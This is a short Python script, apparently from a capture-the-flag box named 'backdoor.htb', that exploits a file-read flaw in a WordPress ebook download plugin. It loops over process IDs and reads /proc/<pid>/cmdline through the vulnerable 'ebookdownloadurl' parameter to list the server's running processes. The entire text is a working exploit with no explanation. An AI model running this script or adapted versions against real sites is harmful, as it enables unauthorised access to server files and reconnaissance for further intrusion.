import requests
for i in range(1, 1000):
 r = requests.get("http://backdoor.htb/wp-content/plugins/ebookdownload/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
 out = (r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close()
</script>','').replace('\00',' '))
 if len(out)>1:
 print("PID"+str(i)+" : "+out)
